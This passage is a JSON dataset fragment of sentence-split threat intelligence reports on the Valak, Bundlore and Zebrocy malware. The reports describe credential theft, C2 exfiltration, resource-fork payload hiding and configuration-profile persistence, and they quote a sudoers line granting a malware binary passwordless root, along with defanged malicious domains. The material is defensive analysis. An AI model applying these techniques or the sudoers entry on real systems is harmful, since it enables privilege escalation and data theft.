        "text": "When referring to additional plugins, it is worth noting that in early versions of Valak the plugins were downloaded by the second stage JS via PowerShell.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S59",
        "text": "More recent versions of Valak abandoned the popular yet easily detectable PowerShell downloader approach and transitioned to PluginHost as a means of managing and downloading additional payloads.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S60",
        "text": "This transition indicates that the Valak authors are looking for stealthier approaches and ways to improve their evasion techniques.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S61",
        "text": "During this analysis, we discovered several different modules with the same internal name, \u201cManagedPlugin.dll\u201d.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S62",
        "text": "These modules are downloaded and loaded by \u201cPluginHost.exe\u201d.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S63",
        "text": "- Systeminfo : responsible for extensive reconnaissance; targets local and domain admins",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S64",
        "text": "- Exchgrabber: aims to steal Microsoft Exchange data and infiltrates the enterprises mail system",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S65",
        "text": "- IPGeo: verifies the geolocation of the target\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S66",
        "text": "- Procinfo: collects information about the infected machine\u2019s running processes\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S67",
        "text": "- Netrecon: performs network reconnaissance",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S68",
        "text": "- Screencap: captures screenshots from the infected machine",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S69",
        "text": "Among these components, some focus on one single, specific activity to achieve their goal and are relatively less robust than others when it comes to capability and potential impact.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S70",
        "text": "This includes ipgeo, procinfo, netrecon and screencap.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S71",
        "text": "Below is a deep dive of \u201csysteminfo\u201d and \u201cexchgrabber\u201d, which are more advanced and complex than the aforementioned plugin components.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S72",
        "text": "\u201cSysteminfo\u201d shares many similarities to \u201cPluginHost.exe\u201d when it comes to class names.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S73",
        "text": "However, unlike \u201cPluginHost\u201d, it contains several reconnaissance functions that focus on gathering information about the user, the machine, and existing AV products.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S74",
        "text": "The module gathers information about the user and attempts to verify whether this is a local admin or a domain admin.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S75",
        "text": "This shows that after infecting the machine, Valak chooses to target mainly administrators and domain admins.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S76",
        "text": "This indicates a propensity to target higher profile accounts such as enterprise admins.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S77",
        "text": "The module attempts to find whether the infected machine has any security products installed using the AntivirusSoftware() function.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S78",
        "text": "The information collected about installed AV programs is gathered using the WMI query \u201cSELECT * FROM AntiVirusProduct\u201d.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S79",
        "text": "The module also collects the physical address (MAC) and the IP address of the infected machine.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S80",
        "text": "Additional reconnaissance activity occurs with several other functions, including:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S81",
        "text": "- NetUser - provides more information about the user",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S82",
        "text": "- provides more information about the user SystemUpTime - records the amount of time the machine is running",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S83",
        "text": "- records the amount of time the machine is running WindowsVersion - determines the Windows version",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S84",
        "text": "In order to exfiltrate data, the plugin uses the function \u201cpost\u201d in the HTTPClient class.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S85",
        "text": "\u201cPost\u201d gives the plugin the ability to upload content and exfiltrate data to the remote C2 whose domain is stored in the registry.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S86",
        "text": "Similar to \u201cPluginHost\u201d, \u201cSystemInfo\u201d uses another function called GetQuery() that builds the URL to send the information to the remote C2.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S87",
        "text": "The URL is encoded using Base64 and some char replacements.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S88",
        "text": "The core functionality of the \u201cManagedPlugin\u201d module is in the \u201cManagedPlugin\u201d class.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S89",
        "text": "The function loops endlessly and continues to execute the reconnaissance activity and send it to the attacker.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S90",
        "text": "Exchgrabber, similar to systeminfo, shares some similarities with PluginHost when it comes to several function names like Bot, HTTPClient, and Utils; however, it has its own differentiated capabilities.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S91",
        "text": "At first glance, the module appears to solely be used to steal credentials, which can be seen in several classes and data arguments with clear names like \u201cCredential\u201d and \u201cCredentialType\u201d.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S92",
        "text": "The module handles its credential management in the class \u201cCredential\u201d, which includes several functions that handle the credential management activity and data types that will hold these credentials.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S93",
        "text": "One of the most interesting functions in this class is \u201cCredential\u201d which receives four arguments: username, password, target, and CredentialType.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S94",
        "text": "It inserts these credentials into the respective module variable.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S95",
        "text": "The \u201ctarget\u201d variable is used in the core ManagedPlugin function to store strings related to Microsoft Office applications.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S96",
        "text": "Another interesting argument in the \u201ccredential\u201d function is \u201cCredentialType\u201d.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S97",
        "text": "The type of credentials is determined by another part of the enum variable called \u201cCredentialType\u201d, which contains each of the credentials that the module will attempt to extract.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S98",
        "text": "The credential types are sensitive information that can be extracted from the enterprise Microsoft Exchange server data, including Domain Password & Domain Certificate.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S99",
        "text": "Extracting this sensitive data allows the attacker access to an inside domain user for the internal mail services of an enterprise along with access to the domain certificate of an enterprise.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S100",
        "text": "With systeminfo, the attacker can identify which user is a domain administrator.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S101",
        "text": "This creates a very dangerous combination of sensitive data leakage and potentially large scale cyber spying or infostealing.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S102",
        "text": "It also shows that the intended target of this malware is first and foremost enterprises.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S103",
        "text": "When inspecting the core logic behind the class MainPlugin, it\u2019s clear how each class collaborates with others to extract data from Microsoft Exchange and Outlook.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S104",
        "text": "The module attempts to check if the extracted data is related to Microsoft Office or MS.Outlook.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S105",
        "text": "If so, it attempts to access the file \u201cAutodiscover.xml\u201d using the function GetFiles.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S106",
        "text": "\u201cAutodiscover.xml\u201d is a dynamically generated file that contains the data Microsoft Outlook needs to access the mailbox entered in the configuration wizard.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S107",
        "text": "The primary purpose of the Exchange Autodiscover service is to establish initial connections to Exchange user mailboxes.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S108",
        "text": "It then attempts to collect the AutoDiscover SMTP address of the dedicated exchange forest, and eventually puts all the extracted data in a variable called \u201ctext\u201d .",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S109",
        "text": "After collecting the sensitive data, the module compresses it using Base64.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S110",
        "text": "This is a new feature of this specific module within the \u201cUtils\u201d class.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S111",
        "text": "Then, it sends the sensitive data to the attacker\u2019s C2 with the POST function and an embedded URI.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S0",
        "text": "The mm-install->macos variant of the Bundlore family of macOS adware has been around for many years in many variations and delivery methods.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S1",
        "text": "Recently, a variant with a novel installation method was discovered.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S2",
        "text": "Although most of the installation details were the same or similar to the samples analyzed in the blogs above, these new samples modified the sudoers file on the infected system to remove the password requirement for privilege escalation.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S3",
        "text": "The malware also utilizes a form of obfuscation not observed before in this family, hiding compressed data in a resource fork on a downloaded script file.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S4",
        "text": "These samples were observed to be installed via a malicious chrome extension (crx file).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S5",
        "text": "This extension was pulled from an adware site http://download[.]mycouponsmartmac[.]com and was not publicly uploaded at the time of analysis.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S6",
        "text": "After the MyCouponsmart extension is installed, javascript is injected into the browser that displays pop-up ads and redirects the user to a website requiring the user to download a fake Adobe Flash Player update.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S7",
        "text": "The software downloaded has a multi-stage installer that, once given authentication from the user, gathers system information and ultimately installs multiple adware programs as root.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S8",
        "text": "The installed program demonstrates persistence on the system and the capability to silently download and install software as root at any time.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S9",
        "text": "Interestingly, this page has a disclaimer included at the bottom informing the user that the installer may suggest installation of additional \u201cfree software offers\u201d and that the Flash Player downloaded from the site is not affiliated with Adobe Flash.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S10",
        "text": "The analyzed samples were manually downloaded from a specially crafted URL from the site http://download[.]mycouponsmartmac[.]com.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S11",
        "text": "Each extension download URL uses a unique GUID, and changing this GUID results in the download of a different sample by hash.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S12",
        "text": "After the downloaded MyCouponsmart extension is installed, it injects javascript code from chrome-extension://background.js into the browser which contains code to either pop up an advertisement or redirect the webpage.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S13",
        "text": "More details regarding this extension are covered in the Configuration Profiles section below.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S14",
        "text": "When the URL in the script above is visited, the user is redirected to another site (in this case, http://cshus[.]albertbucket[.]icu/) which at the time was offering a download for a fake Adobe Flash Update, which downloaded the file AdobeFlashPlayer.zip (SHA256: 98bbcced1edf5ee4d781664b8fe722262aefd1cc4e7aa22a271aa9720de56c15).\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S15",
        "text": "Immediately after the Flash zip file is downloaded, the browser is redirected to a site offering the download of another Chrome extension named \u201cSearch Manager\u201d",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S16",
        "text": "This zip file contained the disk image AdobeFlashPlayer.dmg (SHA256: f425e6b6ac74b2b3b2c8b20b56641dfa8bcdd325b3bcabe023970855cc7f129e) which was automatically mounted.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S17",
        "text": "The mounted DMG does not contain an installer; instead it displays an image containing an alias to a script in the mounted volume:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S18",
        "text": "The script extracts compressed data containing a macOS .app in a hidden resource known as a resource fork.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S19",
        "text": "Resource forks were introduced in the early days of the Macintosh File System (MFS) and are deprecated but are still available, even in macOS Catalina.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S20",
        "text": "Resource forks were originally designed to allow an executable to store multiple resources within the file, yet remain separated from the executable data.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S21",
        "text": "Much like Alternative Data Streams (ADS) on Windows, the data is hidden from regular file and directory viewers, and multiple \u201cstreams\u201d or \u201cforks\u201d are allowed on an individual file.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S22",
        "text": "On macOS, these forks are implemented as an extended attribute (xattr) and can be enumerated or visualized using system tools such as ls and xattr.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S23",
        "text": "When ls is run with the \u2013l flag on a file that contains extended attributes, an \u201c@\u201d character will appear at the end of the file type and permissions listing:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S24",
        "text": "This indicates that the Install.command file has extended attributes, but does not tell us what kind of attributes they are.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S25",
        "text": "If we run ls \u2013l@ however, we can see the listed attributes and their sizes, including the ResourceFork:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S26",
        "text": "We can also use the tool xattr -p to view the contents of the ResourceFork, which in this case is output in hexadecimal (I have used the system command tail below in order to truncate the results \u2013 this shows only the end of the resource contents):",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S27",
        "text": "The script from the analyzed sample is shown below.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S28",
        "text": "This script creates a temporary directory into which it will copy and execute the mm-install-macos app.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S29",
        "text": "The command in the second line of the script takes the last 254kb of the resource fork on the Install.command file, unzips the contents, then further decompresses the data, copying it to the previously created temporary directory.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S30",
        "text": "The decompressed data is a macOS .app, which the script then executes in the background.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S31",
        "text": "Immediately after installation of the application extracted by the script, the user\u2019s browser is redirected to another site that claims the Startup Disk is almost full, offering software to \u201cclean\u201d the system:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S32",
        "text": "Ironically, some of the URL redirects resulting from the browser injection ultimately route through the site mackeeperaffiliates[.]com to the actual MacKeeper download page, the company who wrote up a blog post on this adware last year.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S33",
        "text": "The process tree for the installation of this initial script from VMware Carbon Black Cloud Enterprise EDR showing the myriad system noise created by this activity is shown below.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S34",
        "text": "Once the mm-install-macos application is installed and granted root privileges, it is able to subsequently download and install additional software without re-authentication or Gatekeeper notifications.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S35",
        "text": "A few of the applications observed to be installed by this variant are as follows:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S36",
        "text": "- MyShopcoupon",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S37",
        "text": "- mediaDownloader\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S38",
        "text": "- UpToDateMac",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S39",
        "text": "- EscrowSecurityAlert",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S40",
        "text": "- Advanced Mac Tuneup",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S41",
        "text": "- PingTrusteer",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S42",
        "text": "- macOSOTA",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S43",
        "text": "- Periodikal",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S44",
        "text": "- PingTrusteer \u2013 sudo manipulation",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S45",
        "text": "PingTrusteer is one of the applications installed by the analyzed Bundlore variant above.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S46",
        "text": "This program checks for updates daily using a script pulled from http://request[.]pingtrusteer[.]com/macCheckForUpdates.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S47",
        "text": "The malware gains the ability to install programs with root privileges (without requiring a password) by adding the following line to /etc/sudoers file:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S48",
        "text": "<user> ALL=NOPASSWD: /Users/<user>/Applications/PingTrusteer/PingTrusteer",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S49",
        "text": "Similar to previous variants, the script as pulled from http://request[.]pingtrusteer[.]com on 2 Jun 2020 exhibited the following functionality:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S50",
        "text": "- Checks the user account to see if it is either root or has sudo (root) privileges\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S51",
        "text": "- Checks the domain request[.]pingtrusteer[.]com for any updates to the software\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S52",
        "text": "- Creates MD5 hash of the system\u2019s serial number to use as a unique ID\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S53",
        "text": "- Pulls the versions of the OS and installed web browsers\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S54",
        "text": "- Downloads additional components to the temporary directory mmtmp=\u201d/private/tmp/.mmupdatescripts_$(date +%Y%m%d%H%M%S)\u201d (outlined in the table below)\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S55",
        "text": "- Modifies the sudoers file to grant passwordless execution for the specified programs (PingTrusteer in this case, as seen above)\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S56",
        "text": "- Compiles lists of all installed applications, profiles, LaunchAgents, and LaunchDaemons\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S57",
        "text": "- Checks version of the macOS Malware Removal Tool (MRT)",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S58",
        "text": "- Posts system-specific json data to the server mmp[.]myshopcouponmac[.]com\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S59",
        "text": "This script runs daily to check for updates, and will download and install additional software if offered by the update server, as discussed below.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S60",
        "text": "File Name Application Description pwr.zip mm-install-macos.app Main Bundlore app wt.zip webtools.app Webtools Application imsearch.tar.gz",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S61",
        "text": "SearchMine Browser search tool profile.mobileconfig SearchMine Configuration Profile install-nwt.bin iwt.bin Webtools Installer",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S62",
        "text": "Highlighted in the table above, one of the methods of persistence and infection used by this variant is the creation of a custom configuration profile.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S63",
        "text": "Configuration profiles are typically used in enterprise, educational, or other distributed environments requiring centralized management and deployment of customized system configurations.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S64",
        "text": "In the case of this variant of Bundlore, the SearchMine component installed by mm-install-macos uses the configuration profile to lock several browser settings such as the default search page.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S65",
        "text": "Because it installs these profiles from the command line with root privileges, the user is never notified.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S66",
        "text": "However, Apple announced this week at WWDC that they will be revoking the ability to silently install configuration profiles from the command line without user input, which will disable this ability of the malware.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S67",
        "text": "This post from MalwareBytes details a related malware sample called Crossrider that installs a similar profile, as well as how to list and remove any malicious profiles installed.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S68",
        "text": "In both this Bundlore and the Crossrider samples, the configuration profile was named AdminPrefs.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S69",
        "text": "However, the malicious actors could easily change this name at any time by pushing a new installation script during the daily update check.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S70",
        "text": "For example, the script originally downloads an \u201cAdminPrefs\u201d configuration profile template (also seen in the post referenced above) which it dynamically populates with system-specific information on the victim machine.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S71",
        "text": "This script is configured to install different products depending on what is retrieved from the server.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S72",
        "text": "This allows the malware authors to dynamically change the malware installed on the system, which is all installed with root permissions due to the configuration during initial setup.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S73",
        "text": "Below is a sample of the analyzed script which shows the download and population of the profile template.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S74",
        "text": "In red, the base URL parameters are shown, along with the search domain that the browser will be configured to use.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S75",
        "text": "In blue, the script replaces the fields in the profile template with the custom parameters, and then installs the custom profile as seen in green.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S76",
        "text": "Once a profile is successfully installed, there will be a new icon in the System Preferences dialog as seen below:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S77",
        "text": "The profiles installed depend on the browsers installed on the system, and which browser is set to default.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S78",
        "text": "On the analyzed system configured with Chrome as the default browser, the malware installed a profile that sets the home page, search provider, and new tab default page.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S79",
        "text": "As mentioned before and described in more detail below, it also installs the MyCouponsmart extension via means that render the user unable to remove it.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S80",
        "text": "This profile configuration information is stored in plists on the system after loading.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S81",
        "text": "These per-user profile plists are located under a user directory under /Library/ManagedPreferences/<user>/ and define browser defaults such as the default search and home page.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S82",
        "text": "As mentioned, this script additionally installed a Chrome extension that is unable to be removed by the user, even with administrative privileges.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S83",
        "text": "This is accomplished by using the Chrome ExtensionInstallForceList key which is provided for managed enterprise computers.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S84",
        "text": "According to Chrome documentation:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S85",
        "text": "[ExtensionInstallForceList] Specifies a list of apps and extensions that are installed silently, without user interaction, and which cannot be uninstalled nor disabled by the user.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S86",
        "text": "All permissions requested by the apps/extensions are granted implicitly, without user interaction, including any additional permissions requested by future versions of the app/extension.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S87",
        "text": "This can be seen in the script below as highlighted in red, where the extension ID is lfbenaabfliihodeianphjhhhcjgddlh and points to the URL http://download[.]shoptimizelymac[.]com for updates:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S88",
        "text": "The installed MyCouponsmart extension can be seen in the Chrome extension management page:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S89",
        "text": "Installed policy information seen in the plist above can also be viewed in the Chrome policy page:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S90",
        "text": "Interestingly, this installer sets the dock to \u201chidden\u201d mode during install and all of the desktop items disappear while it is running as seen in the screenshot below.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S91",
        "text": "When this installer script was run again a week after the initial infection, two additional components were installed \u2013 macOSOTA and Periodikal, which appear to be additional Bundlore samples (not covered here, but may be analyzed for a future blog post).\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S92",
        "text": "Furthermore, unlike other adware families like Smokyashan, these additional components are not installed in the usual Applications folder, but instead are installed into the user\u2019s Application directory located in /Users/<user>/Applications.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S93",
        "text": "This folder is not readily visible to the user unless they navigate directly to the directory in Finder.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S94",
        "text": "Although this variant of Bundlore is not significantly different than others seen over the last year, the additional features of manipulating the sudoers file and installation of Configuration Profiles are less commonly seen.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S95",
        "text": "The main takeaway however is that adware is often dismissed, but samples like the Bundlore variant analyzed in this post are able to install anything as root without any notification to the user after initial authentication.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S96",
        "text": "Although the only programs observed to be installed by Bundlore thus far have been adware, with root access and no additional authentication required from the user, any software could be installed with full access to the file system.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S97",
        "text": "Existing customers can learn more about how VMware Carbon Black products protect against this variant of Bundlore by visiting our \u201cBundlore (macOS) mm-install-macos\u201d TAU-TIN hosted on the User Exchange.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S0",
        "text": "At the end of August 2018, the Sednit group launched a spearphishing email campaign where it distributed shortened URLs that delivered the first stage of Zebrocy components.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S1",
        "text": "In the past, Sednit used a similar technique for credential phishing.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S2",
        "text": "However, it is unusual for the group to use this technique to deliver one of its malware components directly.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S3",
        "text": "Previously, it had used exploits to deliver and execute the first stage malware, while in this campaign the group relied entirely on social engineering to lure victims into running the first part of the chain.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S4",
        "text": "The screenshot in Figure 1 shows Bitly statistics for the shortened URL used in this campaign.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S5",
        "text": "About 20 clicks were recorded on this link in the same week that the URL was created, and these presumably downloaded the target archive.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S6",
        "text": "Let\u2019s keep in mind that this may mean fewer than 20 potential victims, as victims may have clicked on the URL twice, or maybe even more times, because the outcome was not what they expected\u2026 as we will describe below.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S7",
        "text": "While ESET telemetry data indicates that this URL was delivered by spearphishing emails, we don\u2019t have a sample of such an email.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S8",
        "text": "The shortened URL leads the victim to an IP-address-based URL, where the archived payload is located.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S9",
        "text": "Unfortunately, without the email message, we don\u2019t know if there are any instructions for the user, if there is any further social engineering, or if it relies solely on the victim\u2019s curiosity.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S10",
        "text": "The archive contains two files; the first is an executable file, while the second is a decoy PDF document.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S11",
        "text": "Note there is a typo in the executable\u2019s filename; it should be \u201c\u0414\u041e\u0412I\u0414\u041d\u0418\u041a\u201d instead of \u201c\u0414\u041e\u0412I\u0414\u041dI\u041a\u201d.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S12",
        "text": "Once the binary is executed, a password prompt dialog box opens.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S13",
        "text": "The result of the password validation will always be wrong, but after the apparent validation attempt, the decoy PDF document is opened.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S14",
        "text": "That document appears to be empty, but the downloader, which is written in Delphi, continues running in the background.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S15",
        "text": "The IP address is also used in the URL hardcoded into the first binary downloader.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S16",
        "text": "The Stage-1 downloader will download and execute a new downloader, written in C++, not so different from other Zebrocy downloaders.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S17",
        "text": "Once again this downloader is as straightforward as the Zebrocy gang\u2019s other downloaders.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S18",
        "text": "It creates an ID and it downloads a new, interesting backdoor, (this time) written in Delphi.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S19",
        "text": "As we explained in our most recent blogpost about Zebrocy, the configuration of the backdoor is stored in in the resource section and is split into four different hex-encoded, encrypted blobs.",
        "type": ""
